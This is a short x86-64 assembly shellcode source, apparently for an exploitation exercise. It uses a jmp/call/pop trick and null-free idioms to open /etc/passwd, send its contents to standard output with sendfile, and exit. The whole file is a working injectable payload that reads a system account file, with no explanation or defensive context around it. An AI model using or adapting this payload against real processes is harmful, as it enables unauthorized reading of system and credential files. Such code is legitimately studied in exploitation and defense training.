        .intel_syntax noprefix
        .globl _start
_start:
        jmp caller
callee:
        pop rdi
        xor rcx, rcx
        mov cl, [rdi]
        inc rdi
        mov [rdi+rcx], ch
main:
        xor rsi, rsi
        push 2
        pop rax
        syscall                 # open
        xchg rsi, rax
        xchg rdx, rax
        push 1
        pop rdi
        push 1
        pop r10
        shl r10, 16
        push 40
        pop rax
        syscall                 # sendfile
        xor rdi, rdi
        push 60
        pop rax
        syscall                 # exit
caller:
        call callee
arg:
        .byte 11
        .ascii "/etc/passwd"
